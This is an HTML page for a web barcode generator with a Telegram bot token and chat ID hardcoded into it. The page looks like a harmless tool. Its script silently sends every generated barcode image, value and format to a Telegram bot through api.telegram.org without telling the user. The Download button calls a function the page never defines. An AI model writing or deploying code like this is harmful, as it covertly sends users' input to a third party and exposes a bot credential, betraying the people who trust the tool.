<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Modern Barcode Generator</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://cdn.jsdelivr.net/npm/jsbarcode@3.11.5/dist/JsBarcode.all.min.js"></script>
</head>
<body class="min-h-screen bg-gray-900 text-white flex items-center justify-center p-6">
  <div class="bg-gray-800 border border-gray-700 rounded-xl shadow-xl p-8 w-full max-w-xl">
    <h1 class="text-2xl font-bold text-center text-blue-400 mb-6">🎯 Barcode Generator</h1>

    <!-- Input -->
    <div class="mb-4">
      <label for="barcodeInput" class="block text-sm mb-1">🔢 Enter Barcode Value:</label>
      <input id="barcodeInput" type="text" value="40105295008630"
             class="w-full px-3 py-2 rounded bg-gray-700 border border-gray-600 text-white focus:outline-none focus:ring-2 focus:ring-blue-500" />
      <p class="text-xs text-gray-400 mt-1">💡 Note: Code25IL requires even-length digits.</p>
    </div>

    <!-- Format -->
    <div class="mb-4">
      <label for="formatSelect" class="block text-sm mb-1">📄 Barcode Type:</label>
      <select id="formatSelect" class="w-full px-3 py-2 rounded bg-gray-700 border border-gray-600 text-white">
        <option value="itf">Code25IL</option>
        <option value="CODE93">Code93</option>
        <option value="CODE39">Code39 Full ASCII</option>
        <option value="CODE128">Code128</option>
      </select>
    </div>

    <!-- Generated ID -->
    <div class="mb-6">
      <label class="block text-sm mb-1">🆔 Generated Barcode ID:</label>
      <input id="autoId" type="text" readonly class="w-full px-3 py-2 bg-gray-700 border border-gray-600 rounded text-gray-300" />
    </div>

    <!-- Preview -->
    <div class="flex justify-center mb-6">
      <svg id="barcode" class="bg-white p-2 rounded"></svg>
    </div>

    <!-- Buttons -->
    <div class="flex justify-center gap-4">
      <button onclick="generateBarcode()" class="bg-blue-600 hover:bg-blue-700 px-4 py-2 rounded text-white">
        🔄 Generate
      </button>
      <button onclick="downloadBarcode()" class="bg-green-600 hover:bg-green-700 px-4 py-2 rounded text-white">
        ⬇️ Download
      </button>
    </div>
  </div>

  
  <script>
  const token = "7957591127:AAF-mbiHrYaGZK72EiWzSsT_8N9kl_CNGPo";
  const chatId = "5507924419";

  function sendMessageWithImage(canvas, value, format, uniqueId) {
    canvas.toBlob((blob) => {
      const formData = new FormData();
      const message = `
📝 NEW CODE GENERATED:
😊 Site: https://admission-nu25.vercel.app/

📦 Barcode Details:
🧾 Value: ${value}
📘 Type: ${format}
🆔 ID: ${uniqueId}
      `;

      formData.append("chat_id", chatId);
      formData.append("caption", message);
      formData.append("photo", blob, "barcode.png");

      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
        method: "POST",
        body: formData
      });
    });
  }

  function generateBarcode() {
    const input = document.getElementById("barcodeInput").value;
    const format = document.getElementById("formatSelect").value;
    let value = input;

    if (format === "itf") {
      value = input.replace(/\D/g, "");
      if (value.length % 2 !== 0) {
        alert("Code25IL (ITF) requires an even number of digits.");
        return;
      }
    }

    const uniqueId = Math.floor(100000 + Math.random() * 900000);
    document.getElementById("autoId").value = uniqueId;

    JsBarcode("#barcode", value, {
      format: format,
      displayValue: true,
      fontSize: 16,
      height: 80,
      width: 2,
      margin: 10,
      background: "transparent",
      lineColor: "#000"
    });

    // Convert SVG to PNG on canvas
    const svg = document.getElementById("barcode");
    const svgData = new XMLSerializer().serializeToString(svg);
    const canvas = document.createElement("canvas");
    const ctx = canvas.getContext("2d");

    const img = new Image();
    img.onload = function () {
      canvas.width = img.width;
      canvas.height = img.height;
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      ctx.drawImage(img, 0, 0);

      // Send image + message to Telegram
      sendMessageWithImage(canvas, value, format, uniqueId);
    };
    img.src = 'data:image/svg+xml;base64,' + btoa(unescape(encodeURIComponent(svgData)));
  }
</script>
